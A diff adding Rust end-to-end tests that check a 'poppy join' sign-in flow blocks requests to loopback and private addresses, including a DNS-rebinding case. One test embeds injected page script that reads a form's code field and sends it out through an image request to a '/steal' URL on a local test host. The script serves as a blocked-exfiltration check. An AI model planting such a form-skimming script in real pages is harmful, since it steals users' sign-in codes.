@@ -21265,6 +21265,11 @@ impl PublicAddressForTest {
             .unwrap_or_else(|e| e.into_inner()) = Some(ip);
         Self
     }
+
+    fn rebound(ip: std::net::IpAddr) -> Self {
+        crate::poppy::TEST_REBOUND.store(true, Ordering::SeqCst);
+        Self::set(ip)
+    }
 }
 
 impl Drop for PublicAddressForTest {
@@ -21272,6 +21277,7 @@ impl Drop for PublicAddressForTest {
         *crate::poppy::TEST_PUBLIC_ADDRESS
             .lock()
             .unwrap_or_else(|e| e.into_inner()) = None;
+        crate::poppy::TEST_REBOUND.store(false, Ordering::SeqCst);
     }
 }
 
@@ -21500,6 +21506,89 @@ async fn e2e_poppy_join_blocks_meta_refresh_to_private_address() {
     target.server.abort();
     assert_eq!(target.requests.load(Ordering::SeqCst), 0, "{resp}");
     assert_error_code(&resp, "request_blocked");
+}
+
+#[cfg(unix)]
+#[tokio::test]
+#[ignore]
+async fn e2e_poppy_join_blocked_request_errors_never_carry_the_code() {
+    let _public = PublicAddressForTest::set("::1".parse().unwrap());
+    let target = poppy_forbidden_target().await;
+    let port = target.origin.rsplit(':').next().unwrap().to_string();
+    let read_code = "document.querySelector('input[name=code]').value";
+    let mut failures = Vec::new();
+    for src in [
+        format!("'{}/steal/' + c + '?code=' + c + '#' + c", target.origin),
+        format!("'http://' + c + '.localhost:{port}/steal?code=' + c"),
+    ] {
+        let page = format!(
+            "{POPPY_FORM}<script>const c = {read_code}; \
+             const i = new Image(); i.src = {src}; document.body.append(i);</script>"
+        );
+        let (origin, site) =
+            poppy_site("[::1]:0", PoppyJoinPage::Html(page), "/done".to_string()).await;
+        let resp = run_poppy_join_with(&origin, "sleep 1; echo '{\"signed_in\":true}'").await;
+        site.abort();
+        if resp["code"] != "request_blocked" {
+            failures.push(format!("{src}: not blocked: {resp}"));
+        }
+        if resp.to_string().contains("bc_e2e_code") {
+            failures.push(format!("{src}: response carries the code: {resp}"));
+        }
+    }
+    target.server.abort();
+    assert_eq!(target.requests.load(Ordering::SeqCst), 0);
+    assert!(failures.is_empty(), "{}", failures.join("\n"));
+}
+
+#[cfg(unix)]
+#[tokio::test]
+#[ignore]
+async fn e2e_poppy_join_refuses_an_endpoint_that_rebinds_to_loopback() {
+    let _rebound = PublicAddressForTest::rebound("::1".parse().unwrap());
+    let marker = tempfile::tempdir().unwrap();
+    let ran = marker.path().join("ran");
+    let page = format!("{POPPY_FORM}<script>fetch('/loaded')</script>");
+    let listener = tokio::net::TcpListener::bind("[::1]:0").await.unwrap();
+    let host = listener.local_addr().unwrap().to_string();
+    let origin = format!("http://{host}");
+    let discovery = json!({
+        "protocol_version": "1.0",
+        "organization": { "domain": host },
+        "web": { "browser_session_endpoint": format!("{origin}/join") },
+    })
+    .to_string();
+    let loaded = Arc::new(AtomicUsize::new(0));
+    let seen = loaded.clone();
+    let site = tokio::spawn(async move {
+        loop {
+            let Ok((mut stream, _)) = listener.accept().await else {
+                return;
+            };
+            let request = read_http_request(&mut stream).await;
+            if request.starts_with("GET /loaded ") {
+                seen.fetch_add(1, Ordering::SeqCst);
+            }
+            let response = if request.starts_with("GET /.well-known/poppy.json ") {
+                http_response("200 OK", "Content-Type: application/json\r\n", &discovery)
+            } else if request.starts_with("POST /join ") {
+                http_response("302 Found", "Location: /done\r\n", "")
+            } else {
+                http_response("200 OK", "Content-Type: text/html\r\n", &page)
+            };
+            let _ = stream.write_all(response.as_bytes()).await;
+        }
+    });
+    let authorizer = format!(
+        "touch '{}'; echo '{{\"signed_in\":true}}'",
+        ran.to_str().unwrap()
+    );
+    let resp = run_poppy_join_with(&origin, &authorizer).await;
+    tokio::time::sleep(std::time::Duration::from_millis(300)).await;
+    site.abort();
+    assert_error_code(&resp, "request_blocked");
+    assert!(!ran.exists(), "the authorizer ran: {resp}");
+    assert_eq!(loaded.load(Ordering::SeqCst), 0, "the page loaded: {resp}");
 }
 
 #[cfg(unix)]
